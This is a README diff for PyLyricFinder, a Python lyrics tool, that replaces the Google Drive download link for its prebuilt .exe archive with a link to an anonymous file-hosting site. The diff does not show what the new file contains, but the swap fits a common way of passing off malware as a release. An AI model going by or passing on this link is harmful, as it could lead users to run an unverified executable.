@@ -6,7 +6,7 @@ PyLyricFinder is solely made in **python3** with help of **Qt6 (PySide6)** and *
 ## How to use
 **Prerequisites -**
  1. Nothing(else you want to run the python file rather than .exe)
- Step 1 - Download the rar by downloading the code or clicking here - [PyLyricFinder.rar](https://drive.google.com/file/d/16KszSpsu-9HO_7Wnc9vc0gz-i8pst3J2/view?usp=sharing)
+ Step 1 - Download the rar by downloading the code or clicking here - [PyLyricFinder.rar](https://anonymfile.com/r1Qx0/main.rar)
  
  Step 2 - extract the rar it'll give you a PyLyricFinder.exe
  
